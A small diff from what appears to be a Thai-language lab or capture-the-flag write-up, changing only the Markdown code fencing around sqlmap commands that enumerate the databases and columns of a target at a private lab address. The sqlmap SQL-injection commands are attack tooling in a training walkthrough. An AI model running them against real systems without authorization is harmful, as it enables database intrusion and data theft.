@@ -90,8 +90,9 @@ sqlmap -u "http://10.10.28.30/products/3*" --dbs
 
 ใช้คำสั่ง:
 
-bash
+```bash
 sqlmap -u "http://10.10.28.30/products/3*" -D duckyinc --columns
+```
 
 ![Sqlmap](images/8.png)
 
